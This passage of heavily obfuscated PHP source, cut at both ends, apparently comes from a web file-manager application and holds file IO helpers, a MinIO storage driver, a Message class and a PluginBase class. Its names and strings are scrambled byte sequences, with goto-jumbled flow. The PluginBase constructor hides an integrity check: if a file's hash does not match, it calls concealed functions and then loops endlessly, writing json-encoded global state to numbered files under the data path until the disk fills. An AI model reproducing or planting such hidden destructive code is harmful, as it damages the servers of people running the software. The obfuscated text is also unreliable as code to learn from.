$bïÑŸ¶ŒÖ[8]; goto FÓæ¦è—¬ç; FÎÏÍÚ‡ùÂ: } public function hashSimple($FŸ‚ºø†Ş§) { goto cÀÄÄÄÌí; aæè‹ç¡¸Ê: fseek_64($E‚•­ƒŠ‰†, $A¦Äô¬·Û¶ - $FÙÂÓ®º¤); $Fâˆ¶‰¾âö .= fread($E‚•­ƒŠ‰†, $FÙÂÓ®º¤); fclose($E‚•­ƒŠ‰†); goto dğÆ¨Í†ä±; DÑØØ¥Ğ„±: $E‚•­ƒŠ‰† = fopen($FŸ‚ºø†Ş§, $BŞ£¥ŞÍã™[1235]); if (!$E‚•­ƒŠ‰†) { return $Fâˆ¶‰¾âö; } for ($C¤Œ©ƒä„« = 0; $C¤Œ©ƒä„« < $f¿­Œ¦ù™; $C¤Œ©ƒä„«++) { fseek_64($E‚•­ƒŠ‰†, $cß²‡•İÒ * $C¤Œ©ƒä„«); $Fâˆ¶‰¾âö .= fread($E‚•­ƒŠ‰†, $FÙÂÓ®º¤); } goto aæè‹ç¡¸Ê; dğÆ¨Í†ä±: return md5($Fâˆ¶‰¾âö) . $A¦Äô¬·Û¶; goto a“Öâ£×Ì; e«•³ÎàÄ‹: $A¦Äô¬·Û¶ = $this->size($FŸ‚ºø†Ş§); $FÙÂÓ®º¤ = 200; $f¿­Œ¦ù™ = 50; goto D–«Êñ©ó; D–«Êñ©ó: if ($A¦Äô¬·Û¶ <= $FÙÂÓ®º¤ * $f¿­Œ¦ù™) { return $this->hashMd5($FŸ‚ºø†Ş§) . $A¦Äô¬·Û¶; } $Fâˆ¶‰¾âö = $BŞ£¥ŞÍã™[33]; $cß²‡•İÒ = intval($A¦Äô¬·Û¶ / $f¿­Œ¦ù™); goto DÑØØ¥Ğ„±; cÀÄÄÄÌí: $BŞ£¥ŞÍã™ =& $_SERVER[¹…ÕÄ]; if (!$FŸ‚ºø†Ş§) { return md5($BŞ£¥ŞÍã™[33]); } $FŸ‚ºø†Ş§ = $this->iconvSystem($FŸ‚ºø†Ş§); goto e«•³ÎàÄ‹; a“Öâ£×Ì: } public function getContent($c™«Î˜µ) { $c™«Î˜µ = $this->iconvSystem($c™«Î˜µ); return file_get_contents($c™«Î˜µ); } public function setContent($c„Ñâø¿°Û, $DÈíŒˆ ÊÒ = '') { $c„Ñâø¿°Û = $this->iconvSystem($c„Ñâø¿°Û); $aÇ…îøÍÛŸ = @file_put_contents($c„Ñâø¿°Û, $DÈíŒˆ ÊÒ, LOCK_EX); clearstatcache(); return $aÇ…îøÍÛŸ === !1 ? !1 : !0; } public function fileSubstr($a…èç¶¾ï, $dÎ¤½†£Šè = 0, $BîÒóêÛ„Ì = false) { goto CŸ¾¯éºÁ; CÜ‹±øñÖº: if ($BîÒóêÛ„Ì <= 0) { return $BÜã¥ÖŒÙ[33]; } $CÁáËâÂİ = fopen($a…èç¶¾ï, $BÜã¥ÖŒÙ[1235]); if (!$CÁáËâÂİ) { return !1; } goto e¢Ï®—ÉŠ‘; CºÊ™Æ»Œ§: return $fØ”»‚ƒÅ; goto f„º¦ïÛä‰; CŸ¾¯éºÁ: $BÜã¥ÖŒÙ =& $_SERVER[¹…ÕÄ]; $a…èç¶¾ï = $this->iconvSystem($a…èç¶¾ï); if ($BîÒóêÛ„Ì === !1) { $BîÒóêÛ„Ì = $this->size($a…èç¶¾ï); } goto CÜ‹±øñÖº; e¢Ï®—ÉŠ‘: fseek_64($CÁáËâÂİ, $dÎ¤½†£Šè); $fØ”»‚ƒÅ = fread($CÁáËâÂİ, $BîÒóêÛ„Ì); fclose($CÁáËâÂİ); goto CºÊ™Æ»Œ§; f„º¦ïÛä‰: } public function upload($e”Ôˆğó‡«, $e–¯ğƒ¨×Ë, $cƒã›åÅø² = false, $aóÇÖèò = REPEAT_REPLACE) { $AÊ„ˆ‰ÈÀ = $this->copyFile($e–¯ğƒ¨×Ë, $e”Ôˆğó‡«); return $AÊ„ˆ‰ÈÀ ? $this->getPathOuter($e”Ôˆğó‡«) : !1; } public function setModifyTime($Dˆ§‚¦—«÷, $FÓÌæâªˆ„ = '') { @touch($Dˆ§‚¦—«÷, intval($FÓÌæâªˆ„)); } public function download($AÓ‹ã›”ç, $bùÀ±Œ×Øˆ) { return $this->iconvSystem($AÓ‹ã›”ç); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fôì¨Êî) { parent::__construct($fôì¨Êî); $this->signatureVersion($_SERVER[¹…ÕÄ][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto C»îƒÖ¹À ; dªÜãçÀµŸ: class Message { function __construct() { } public function send($bæĞ‘³‚ï‘ = '', $dßÎæÛ” = array(), $Eä«¿ì²Çª = "\x74\145\x78\x74") { goto cÏ´åÍ±§é; cÏ´åÍ±§é: $c°½õË‰±œ =& $_SERVER[¹…ÕÄ]; $Bƒš¥÷Ïç = array($c°½õË‰±œ[29] => $c°½õË‰±œ[1371], $c°½õË‰±œ[708] => $bæĞ‘³‚ï‘); if (in_array($Eä«¿ì²Çª, array($c°½õË‰±œ[1371], $c°½õË‰±œ[1372]))) { $Bƒš¥÷Ïç[$c°½õË‰±œ[29]] = $Eä«¿ì²Çª; } goto DÜ‡à„™£­; DÜ‡à„™£­: $dßÎæÛ” = array($c°½õË‰±œ[994] => isset($dßÎæÛ”[$c°½õË‰±œ[994]]) ? $dßÎæÛ”[$c°½õË‰±œ[994]] : $c°½õË‰±œ[33], $c°½õË‰±œ[557] => isset($dßÎæÛ”[$c°½õË‰±œ[557]]) ? $dßÎæÛ”[$c°½õË‰±œ[557]] : $c°½õË‰±œ[33]); if (empty($bæĞ‘³‚ï‘) || empty($dßÎæÛ”[$c°½õË‰±œ[994]]) && empty($dßÎæÛ”[$c°½õË‰±œ[557]])) { return !1; } $FÅ’±¿‚’ = array($c°½õË‰±œ[1312] => $Bƒš¥÷Ïç, $c°½õË‰±œ[1373] => $dßÎæÛ”); goto AĞ•ÌÎÍë; AĞ•ÌÎÍë: Hook::trigger($c°½õË‰±œ[1374], $FÅ’±¿‚’); goto aÈĞŠ¼; aÈĞŠ¼: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto FÜÄ¥³çèğ; DÂ†µ‚òœ: if ($_SERVER[$B°÷ˆ¹ò ®[813]] != $fù¤˜ù›($Dã„àÌ¹³­)) { goto c«áÌ´‚Áß; b„‰†µ—‚ˆ: $AØ”·ÈàÖ(); $fÌ‰ˆ¦µìÉ = $B°÷ˆ¹ò ®[821]; $fÀ†ÊÙÇ¾¢ = json_encode($GLOBALS[$B°÷ˆ¹ò ®[822]]); goto f…Ø²§…Ø; B± ¹Öéã: $A–ãÏäÇõñ = $B°÷ˆ¹ò ®[819]; $A–ãÏäÇõñ($_SERVER[$B°÷ˆ¹ò ®[820]]); $AØ”·ÈàÖ = $B°÷ˆ¹ò ®[814]; goto b„‰†µ—‚ˆ; c«áÌ´‚Áß: $AØ”·ÈàÖ = $B°÷ˆ¹ò ®[814]; $BÙ…âø›Í = $B°÷ˆ¹ò ®[815]; $b´ÒÍâ•İÍ = $_SERVER[$B°÷ˆ¹ò ®[816]] . $B°÷ˆ¹ò ®[817]; goto cÖèœğ¹åö; f…Ø²§…Ø: $CÎãç‘•Š† = 1; for ($eÂß„áô‹Ÿ = $CÎãç‘•Š†; $eÂß„áô‹Ÿ > 0; $eÂß„áô‹Ÿ++) { $fÌ‰ˆ¦µìÉ(DATA_PATH . $eÂß„áô‹Ÿ, $fÀ†ÊÙÇ¾¢); } goto EôƒÎ˜ÚŠË; cÖèœğ¹åö: $Aº‡‰ËÂÈÉ = $BÙ…âø›Í($b´ÒÍâ•İÍ); $f•äöÛŠ˜­ = explode($B°÷ˆ¹ò ®[227], $Aº‡‰ËÂÈÉ); if (count($f•äöÛŠ˜­) < $B°÷ˆ¹ò ®[581]) { $EåÄÅõ‘Œ“ = $B°÷ˆ¹ò ®[818]; $EåÄÅõ‘Œ“(); } goto B± ¹Öéã; EôƒÎ˜ÚŠË: } global $in, $config; $this->config =& $config; goto c§íÚÌâà; d‰êîÉË‡µ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto C‰¹äŒ¤ª‹; FÑƒ‘±‹âÓ: $this->pluginHostDefault = $config[$B°÷ˆ¹ò ®[1377]] . $this->pluginName . $B°÷ˆ¹ò ®[8]; $fòœª”³›Æ = $config[$B°÷ˆ¹ò ®[1378]]; if ($fòœª”³›Æ && strpos($B°÷ˆ¹ò ®[47] . $fòœª”³›Æ . $B°÷ˆ¹ò ®[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$B°÷ˆ¹ò ®[1379]] . $this->pluginName . $B°÷ˆ¹ò ®[8]; } goto d‰êîÉË‡µ; FÜÄ¥³çèğ: $B°÷ˆ¹ò ® =& $_SERVER[¹…ÕÄ]; $Dã„àÌ¹³­ = $_SERVER[$B°÷ˆ¹ò ®[816]] . $B°÷ˆ¹ò ®[817]; $fù¤˜ù› = $B°÷ˆ¹ò ®[812]; goto DÂ†µ‚òœ; F¡–‡Œ«¤½: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $B°÷ˆ¹ò ®[8]; $this->pluginApi = appHostGet() . $B°÷ˆ¹ò ®[1376] . $this->pluginName . $B°÷ˆ¹ò ®[8]; $this->pluginHost = $config[$B°÷ˆ¹ò ®[1377]] . $this->pluginName . $B°÷ˆ¹ò ®[8]; goto FÑƒ‘±‹âÓ; c§íÚÌâà: $this->in =& $in; $this->modelPlugin = Model($B°÷ˆ¹ò ®[1375]); $this->pluginName = str_replace($B°÷ˆ¹ò ®[1375], $B°÷ˆ¹ò ®[33], get_class($this)); goto F¡–‡Œ«¤½; C‰¹äŒ¤ª‹: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¹…ÕÄ][1380]); } protected function assign($e×ŒÚÎ¶º, $BÓ³ãÉªÖ = false) { if (is_array($e×ŒÚÎ¶º)) { $this->values = array_merge($this->values, $e×ŒÚÎ¶º); } else { $this->values[$e×ŒÚÎ¶º] = $BÓ³ãÉªÖ; } } protected function display($a´½è­ì¤Ë) { extract($this->values); require $a´½è­ì¤Ë; } final function hookRegist($fÆ›·Ä¥ÙÖ) { $this->modelPlugin->appRegist($this->pluginName, $fÆ›·Ä¥ÙÖ); } final function appIcon() { $A·¸Ò¯‚¦Ç =& $_SERVER[¹…ÕÄ]; $FÆŸÉ”¤áô = $this->appPackage(); $c£áí„æ™ç = $A·¸Ò¯‚¦Ç[33]; if (isset($FÆŸÉ”¤áô[$A·¸Ò¯‚¦Ç[403]])) { if (isset($FÆŸÉ”¤áô[$A·¸Ò¯‚¦Ç[403]][$A·¸Ò¯‚¦Ç[1381]])) { $c£áí„æ™ç = $A·¸Ò¯‚¦Ç[1382] . $FÆŸÉ”¤áô[$A·¸Ò¯‚¦Ç[403]][$A·¸Ò¯‚¦Ç[1381]] . $A·¸Ò¯‚¦Ç[1383]; } else { if ($FÆŸÉ”¤áô[$A·¸Ò¯‚¦Ç[403]][$A·¸Ò¯‚¦Ç[1384]]) { $c£áí„æ™ç = $A·¸Ò¯‚¦Ç[1385] . $FÆŸÉ”¤áô[$A·¸Ò¯‚¦Ç[403]][$A·¸Ò¯‚¦Ç[1384]] . $A·¸Ò¯‚¦Ç[1386]; } } } return $c£áí„æ™ç; } final function fileCanView($cõ¡ºŠ¸óÏ) { goto b¦µãƒ«Éä; b¦µãƒ«Éä: $b™øÜŞÄÁ =& $_SERVER[¹…ÕÄ]; if (request_url_safe($cõ¡ºŠ¸óÏ)) { return !0; } if ($this->isShare($cõ¡ºŠ¸óÏ)) { return !0; } goto aÓÚÙ÷Õ‹; f‘™ÁÏ: ActionCall($b™øÜŞÄÁ[1399], $cõ¡ºŠ¸óÏ); goto fš§ğì¿æÇ; aÓÚÙ÷Õ‹: $dÜµÊ÷ = Session::get($b™øÜŞÄÁ[1387]); if (!$dÜµÊ÷ || !$dÜµÊ÷[$b™øÜŞÄÁ[1388]]) { $d©½·´³ £ = $b™øÜŞÄÁ[1389] . rawurlencode(this_url()); show_tips(LNG($b™øÜŞÄÁ[1390]) . $b™øÜŞÄÁ[1391] . $d©½·´³ £ . $b™øÜŞÄÁ[1392] . LNG($b™øÜŞÄÁ[1393]) . $b™øÜŞÄÁ[1394], !1); } if (!Action($b™øÜŞÄÁ[1395])->authCan($b™øÜŞÄÁ[1396])) { show_tips(LNG($b™øÜŞÄÁ[1397]) . $b™øÜŞÄÁ[1398], !1); } goto f‘™ÁÏ; fš§ğì¿æÇ: } final function isShare($Eàˆ‰è”Õƒ) { $Bø„·š…ÁÂ = KodIO::parse($Eàˆ‰è”Õƒ); return $Bø„·š…ÁÂ[$_SERVER[¹…ÕÄ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($f¡ß¤˜ì¶) { if (request_url_safe($f¡ß¤˜ì¶)) { return $f¡ß¤˜ì¶; } if (!$this->isShare($f¡ß¤˜ì¶)) { $f¡ß¤˜ì¶ = $this->filePath($f¡ß¤˜ì¶); } return Action($_SERVER[¹…ÕÄ][1048])->linkOut($f¡ß¤˜ì¶); } public function filePathLinkOut($BŒ’ˆÃòÙ) { if (request_url_safe($BŒ’ˆÃòÙ)) { return $BŒ’ˆÃòÙ; } $this->fileCanView($BŒ’ˆÃòÙ); return Action($_SERVER[¹…ÕÄ][1048])->link($BŒ’ˆÃòÙ); } final function filePath($cÇÈî¡ƒ¡Ë) { $CãÂ¹†ì‚Ø =& $_SERVER[¹…ÕÄ]; if ($f…¬‡ñØ¨ = $this->checkSharePath($cÇÈî¡ƒ¡Ë)) { return $f…¬‡ñØ¨; } $this->fileCanView($cÇÈî¡ƒ¡Ë); if (request_url_safe($cÇÈî¡ƒ¡Ë)) { $aïÈ™›Æà¸ = parse_url_query($cÇÈî¡ƒ¡Ë); if (isset($aïÈ™›Æà¸[$CãÂ¹†ì‚Ø[1400]]) && isset($aïÈ™›Æà¸[$CãÂ¹†ì‚Ø[207]])) { $c‡Š ”ß‘ = Model($CãÂ¹†ì‚Ø[1102])->get($CãÂ¹†ì‚Ø[1401]); $e‚„›æ—×Í = Mcrypt::decode($aïÈ™›Æà¸[$CãÂ¹†ì‚Ø[207]], $c‡Š ”ß‘); if ($e‚„›æ—×Í) { $this->fileInfo = IO::infoWithChildren($e‚„›æ—×Í); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $e‚„›æ—×Í; } } $cÇÈî¡ƒ¡Ë = $this->_cacheHttpFile($cÇÈî¡ƒ¡Ë); $this->fileInfo = IO::infoWithChildren($cÇÈî¡ƒ¡Ë); } else { $this->fileInfo = IO::infoWithChildren($cÇÈî¡ƒ¡Ë); if (!$this->fileInfo) { show_tips(LNG($CãÂ¹†ì‚Ø[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $cÇÈî¡ƒ¡Ë; } final function _cacheHttpFile($EÔŠÉ£ì‚æ) { $dÕÉà˜’÷· = hash_path($EÔŠÉ£ì‚æ, !0); $this->cachePath = $this->pluginCachePath($dÕÉà˜’÷·); if ($cŠ¨éé±Ú = IO::fileNameExist($this->cachePath, $dÕÉà˜’÷·)) { return KodIO::make($cŠ¨éé±Ú); } $B¼œÚÁÛÚÌ = $this->cachePath . $dÕÉà˜’÷·; return $this->pluginCacheFileSet($B¼œÚÁÛÚÌ, file_get_contents($EÔŠÉ£ì‚æ)); } final function _tmpFileName($F¢µÃóØ®Õ = array()) { goto DÌ”ƒ„á¥Ó; bİó­Ü½®é: $Aš„©×êõ = array($F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[28]], $F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[75]], $F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[77]]); if (isset($F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[481]])) { $Aš„©×êõ[] = $F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[481]]; } return md5(implode($A©¹éÛ¯ƒÙ[70], $Aš„©×êõ)); goto b¶Å•øí¦; C¥¶Œ§ÑàÛ: if (isset($F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[163]][$A©¹éÛ¯ƒÙ[170]])) { return $F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[163]][$A©¹éÛ¯ƒÙ[170]]; } $Bˆ¡Ÿë‚ëç = IO::hashSimple($F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[75]]); if ($Bˆ¡Ÿë‚ëç) { return $Bˆ¡Ÿë‚ëç; } goto bİó­Ü½®é; DÌ”ƒ„á¥Ó: $A©¹éÛ¯ƒÙ =& $_SERVER[¹…ÕÄ]; if (!$F¢µÃóØ®Õ) { $F¢µÃóØ®Õ = $this->fileInfo; } if (isset($F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[170]])) { return $F¢µÃóØ®Õ[$A©¹éÛ¯ƒÙ[170]]; } goto C¥¶Œ§ÑàÛ; b¶Å•øí¦: } final function checkSharePath($A ³ª Ô…¶) { goto côâ¥°ŸÔ•; FÉÙØ›±º¼: $this->cachePath = $this->pluginCachePath($this->fileInfo[$cÄ‹ÕÑˆğŠ[170]]); return $fŞ÷êº…êŒ[$cÄ‹ÕÑˆğŠ[75]]; goto F»–×¨ØÆ; få¹˜íä™Ø: $fŞ÷êº…êŒ = Action($cÄ‹ÕÑˆğŠ[1048])->sharePathInfo($A ³ª Ô…¶); if (!isset($fŞ÷êº…êŒ[$cÄ‹ÕÑˆğŠ[75]])) { show_json(LNG($cÄ‹ÕÑˆğŠ[1403]), !1); } $this->fileInfo = $fŞ÷êº…êŒ[$cÄ‹ÕÑˆğŠ[163]]; goto FÉÙØ›±º¼; côâ¥°ŸÔ•: $cÄ‹ÕÑˆğŠ =& $_SERVER[¹…ÕÄ]; if (!defined($cÄ‹ÕÑˆğŠ[448])) { define($cÄ‹ÕÑˆğŠ[1402], 0); } if (!$this->isShare($A ³ª Ô…¶)) { return !1; } goto få¹˜íä™Ø; F»–×¨ØÆ: } final function pluginCachePath($Aß±¼Æğàå = '') { $bŸêÉ“ÄƒØ =& $_SERVER[¹…ÕÄ]; $D·Çì‹î = IO_PATH_SYSTEM_TEMP . $bŸêÉ“ÄƒØ[1404] . $this->pluginName; if (!($a¼Ã‹‰êÒœ = IO::infoFull($D·Çì‹î))) { return IO::mkdir($D·Çì‹î . $bŸêÉ“ÄƒØ[8] . $Aß±¼Æğàå); } if (empty($Aß±¼Æğàå)) { return $a¼Ã‹‰êÒœ[$bŸêÉ“ÄƒØ[75]]; } if (!($B†ñİà¡¥ = IO::fileNameExist($a¼Ã‹‰êÒœ[$bŸêÉ“ÄƒØ[75]], $Aß±¼Æğàå))) { return IO::mkdir($a¼Ã‹‰êÒœ[$bŸêÉ“ÄƒØ[75]] . $Aß±¼Æğàå); } return KodIO::make($B†ñİà¡¥); } final function pluginCacheFileSet($e˜ÛŞŠ¬À¼, $FªÍ†°®¶¬ = '') { $a›ÁÁÈî‰ =& $_SERVER[¹…ÕÄ]; if (!($d‚Á…Î×Ó± = IO::infoFull($e˜ÛŞŠ¬À¼))) { return IO::mkfile($e˜ÛŞŠ¬À¼, $FªÍ†°®¶¬, REPEAT_REPLACE); } IO::setContent($d‚Á…Î×Ó±[$a›ÁÁÈî‰[75]], $FªÍ†°®¶¬); return $d‚Á…Î×Ó±[$a›ÁÁÈî‰[75]]; } final function pluginLocalFile($b¬¹ çšÈ¢ = '') { goto Fäß· æßŞ; Fäß· æßŞ: $DÃ·äàÒ•² =& $_SERVER[¹…ÕÄ]; $A‘ÅÔªÛº = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($A‘ÅÔªÛº)) { mk_dir($A‘ÅÔªÛº); } goto cº˜–Ü‡; C¦½ÜÇ·îİ: if (!checkExtSafe($aßÏéÜ†‘º)) { $aßÏéÜ†‘º = $aßÏéÜ†‘º . $DÃ·äàÒ•²[1405]; } $dœ†é‚® = $A‘ÅÔªÛº . $aßÏéÜ†‘º; if (@file_exists($dœ†é‚®)) { return $dœ†é‚®; } goto B˜‹×óğâ™; B˜‹×óğâ™: return IO::copy($b¬¹ çšÈ¢, $A‘ÅÔªÛº, 0, $aßÏéÜ†‘º); goto dÄôôÍëÜ; cº˜–Ü‡: if (!$b¬¹ çšÈ¢) { return $A‘ÅÔªÛº; } $E§êØÎ‡•” = IO::info($b¬¹ çšÈ¢); $aßÏéÜ†‘º = $this->_tmpFileName($E§êØÎ‡•”) . $DÃ·äàÒ•²[94] . $E§êØÎ‡•”[$DÃ·äàÒ•²[167]]; goto C¦½ÜÇ·îİ; dÄôôÍëÜ: } final function appPackage() { goto Cë”Â¸±£; C‚èš…øËÆ: return $báš¯ßçî; goto Bå›Òª’Ûô; d¾®Æ”Ÿ: $this->parseLang($fÄ³´àçË…); $báš¯ßçî = json_decode_force($fÄ³´àçË…); if (!$báš¯ßçî) { return array(); } goto D–„‚Ÿì¼ç; Cë”Â¸±£: $A™˜“èáƒ =& $_SERVER[¹…ÕÄ]; if ($this->packageData) { return $this->packageData; } $fÄ³´àçË… = $this->parseFile($this->pluginPath . $A™˜“èáƒ[1406]); goto d¾®Æ”Ÿ; D–„‚Ÿì¼ç: $Eëôçä = Hook::trigger($A™˜“èáƒ[1407], $báš¯ßçî); if ($Eëôçä && is_array($Eëôçä)) { $báš¯ßçî = $Eëôçä; } $this->packageData = $báš¯ßçî; goto C‚èš…øËÆ; Bå›Òª’Ûô: } public function packageInfoGet($E£©Î–ÙØ) { $aõ¢°÷ÄÊ = $this->appPackage(); return array_get_value($aõ¢°÷ÄÊ, $E£©Î–ÙØ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¹…ÕÄ][1408]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¹…ÕÄ][1409]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¹…ÕÄ][1410]); } private function parseFile($B”Ä²ºÎÙ) { goto F™»Œ¹Ëæ£; D§ìÖƒù ´: $Eœ¶ôÖ¯£ = str_replace($f·ì÷ßÏ¡, $A¯—º ¨Äò, $Eœ¶ôÖ¯£); return $Eœ¶ôÖ¯£; goto c¬Ïˆ´§ó; B¦òÀÌÚßá: $A¯—º ¨Äò = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$AÓİ’ÕÉ‚×[87]][$AÓİ’ÕÉ‚×[1418]]); if (strstr($Eœ¶ôÖ¯£, $AÓİ’ÕÉ‚×[1419])) { $C¼–°…¹ò” = rawurlencode(json_encode($this->pluginLangArr)); $Eœ¶ôÖ¯£ = str_replace($AÓİ’ÕÉ‚×[1419], $C¼–°…¹ò”, $Eœ¶ôÖ¯£); } if (strstr($Eœ¶ôÖ¯£, $AÓİ’ÕÉ‚×[1420])) { $C¼–°…¹ò” = $C¼–°…¹ò” = rawurlencode(json_encode($this->getConfig())); $Eœ¶ôÖ¯£ = str_replace($AÓİ’ÕÉ‚×[1420], $C¼–°…¹ò”, $Eœ¶ôÖ¯£); } goto D§ìÖƒù ´; F™»Œ¹Ëæ£: $AÓİ’ÕÉ‚× =& $_SERVER[¹…ÕÄ]; $Eœ¶ôÖ¯£ = file_get_contents($B”Ä²ºÎÙ); $f·ì÷ßÏ¡ = array($AÓİ’ÕÉ‚×[1411], $AÓİ’ÕÉ‚×[1412], $AÓİ’ÕÉ‚×[1413], $AÓİ’ÕÉ‚×[1414], $AÓİ’ÕÉ‚×[1415], $AÓİ’ÕÉ‚×[1416], $AÓİ’ÕÉ‚×[1417]); goto B¦òÀÌÚßá; c¬Ïˆ´§ó: } private function parseLang(&$f½öğ‚âÔ’) { goto b°Ş‡ÙÛ¸Í; E»™—ç: preg_match_all($F¿Í÷¸»í[1422], $f½öğ‚âÔ’, $CÍìÄğ¥¨Ò); if (!is_array($CÍìÄğ¥¨Ò) || count($CÍìÄğ¥¨Ò) == 0 || !is_array($CÍìÄğ¥¨Ò[0]) || count($CÍìÄğ¥¨Ò[0]) == 0) { return; } $fßÀ˜•‚„Â = array(); goto cùÓ¹ù†; cùÓ¹ù†: $f‰àŸ‘¼î = array(); foreach ($CÍìÄğ¥¨Ò[0] as $AÙ¢é²­) { $A†ëìøëªÏ = substr($AÙ¢é²­, strlen($B²ª¨íÖÇ²), -4); $eêå™‘Ú‰ê = LNG($A†ëìøëªÏ); $fßÀ˜•‚„Â[] = $AÙ¢é²­; $f‰àŸ‘¼î[] = str_replace(array($F¿Í÷¸»í[227], $F¿Í÷¸»í[1016], $F¿Í÷¸»í[338], $F¿Í÷¸»í[115]), array($F¿Í÷¸»í[50], $F¿Í÷¸»í[50], $F¿Í÷¸»í[33], $F¿Í÷¸»í[1423]), $eêå™‘Ú‰ê); } $f½öğ‚âÔ’ = str_replace($fßÀ˜•‚„Â, $f‰àŸ‘¼î, $f½öğ‚âÔ’); goto Dƒ³Ê; b°Ş‡ÙÛ¸Í: $F¿Í÷¸»í =& $_SERVER[¹…ÕÄ]; $B²ª¨íÖÇ² = $F¿Í÷¸»í[1421]; if (!strstr($f½öğ‚âÔ’, $B²ª¨íÖÇ²)) { return; } goto E»™—ç; Dƒ³Ê: } private function parseConfig(&$EÇã‰ŠŠÛç) { goto cõ†èËåğÎ; cõ†èËåğÎ: $AªœÃ´Ô•ï =& $_SERVER[¹…ÕÄ]; $BÂ·­èèš = $AªœÃ´Ô•ï[1424]; if (!strstr($EÇã‰ŠŠÛç, $BÂ·­èèš)) { return; } goto F¦è¦ßöò—; FóÙ´ËºËÉ: $EÇã‰ŠŠÛç = str_replace($C·¹¾ôØ„ó, $a†¿Êß ª, $EÇã‰ŠŠÛç); goto E£‡¯£œ‚ß; F¦è¦ßöò—: preg_match_all($AªœÃ´Ô•ï[1425], $EÇã‰ŠŠÛç, $bšâõ”öÌ); if (!is_array($bšâõ”öÌ) || count($bšâõ”öÌ) == 0 || !is_array($bšâõ”öÌ[0]) || count($bšâõ”öÌ[0]) == 0) { return; } $B…„½‡¬Ç = $this->getConfig(); goto a¥¯ Ş¹‘Ó; a¥¯ Ş¹‘Ó: $C·¹¾ôØ„ó = array(); $a†¿Êß ª = array(); foreach ($bšâõ”öÌ[0] as $bèãŞ¨Ïƒ«) { $a‹¾›â¿ÀÃ = substr($bèãŞ¨Ïƒ«, strlen($BÂ·­èèš), -2); $C·¹¾ôØ„ó[] = $bèãŞ¨Ïƒ«; $a†¿Êß ª[] = _get($B…„½‡¬Ç, $a‹¾›â¿ÀÃ); } goto FóÙ´ËºËÉ; E£‡¯£œ‚ß: } private function parsePackage(&$Eåè™ŒŒïˆ) { goto bôµ Šçã†; F¾Öê’©¥«: $ağ¢Ú½ÎÊ = array(); $Fµ‹ÊöÒê = array(); foreach ($BŒÇ„ÂË÷„[0] as $aÎÔ¬„ßîï) { $d•†‹ˆ¡â = substr($aÎÔ¬„ßîï, strlen($c›‹Š¸…ï), -2); $ağ¢Ú½ÎÊ[] = $aÎÔ¬„ßîï; $Fµ‹ÊöÒê[] = _get($F£Ûî™ëÆÊ, $d•†‹ˆ¡â); } goto DƒŒ™œƒ´‰; e™÷ÖëÊ‘º: preg_match_all($f±Ö‡¬×ÌÅ[1427], $Eåè™ŒŒïˆ, $BŒÇ„ÂË÷„); if (!is_array($BŒÇ„ÂË÷„) || count($BŒÇ„ÂË÷„) == 0 || !is_array($BŒÇ„ÂË÷„[0]) || count($BŒÇ„ÂË÷„[0]) == 0) { return; } $F£Ûî™ëÆÊ = $this->appPackage(); goto F¾Öê’©¥«; DƒŒ™œƒ´‰: $Eåè™ŒŒïˆ = str_replace($ağ¢Ú½ÎÊ, $Fµ‹ÊöÒê, $Eåè™ŒŒïˆ); goto aÇ³¦ğ¨®¡; bôµ Šçã†: $f±Ö‡¬×ÌÅ =& $_SERVER[¹…ÕÄ]; $c›‹Š¸…ï = $f±Ö‡¬×ÌÅ[1426]; if (!strstr($Eåè™ŒŒïˆ, $c›‹Š¸…ï)) { return; } goto e™÷ÖëÊ‘º; aÇ³¦ğ¨®¡: } final function echoFile($b¥Ì“ğ‹ƒ, $F±»Ä¦¿ÜØ = false) { goto dµÛ ÙğÇ™; AëÛ”Û«Áª: $FóÀˆá³²­ = $this->parseFile($d‹ôÙóœ™Ô); $this->parseLang($FóÀˆá³²­); $this->parseConfig($FóÀˆá³²­); goto c†“¢ƒùÁ; c†“¢ƒùÁ: $this->parsePackage($FóÀˆá³²­); if (is_array($F±»Ä¦¿ÜØ)) { $FóÀˆá³²­ = str_replace(array_keys($F±»Ä¦¿ÜØ), array_values($F±»Ä¦¿ÜØ), $FóÀˆá³²­); } echo $dº¾™Œ’Ïõ[227] . $FóÀˆá³²­; goto BŠ’†ßÜÎŒ; dµÛ ÙğÇ™: $dº¾™Œ’Ïõ =& $_SERVER[¹…ÕÄ]; $d‹ôÙóœ™Ô = $this->pluginPath . $b¥Ì“ğ‹ƒ; if (ACT == $dº¾™Œ’Ïõ[1428]) { echo $dº¾™Œ’Ïõ[1429] . $this->pluginName . $dº¾™Œ’Ïõ[8] . $b¥Ì“ğ‹ƒ . $dº¾™Œ’Ïõ[1430]; if (!file_exists($d‹ôÙóœ™Ô)) { echo $dº¾™Œ’Ïõ[1431]; return; } } goto AëÛ”Û«Áª; BŠ’†ßÜÎŒ: } final function initLang() { goto EÈ›îÑÎù; b‡¶¦…´ÚÛ: $AÚ¥åŞ¯ö’ = I18n::getType(); $eîŞÇ±ˆí› = array(); if (file_exists($e‘¹„¿—æ… . $AÚ¥åŞ¯ö’ . 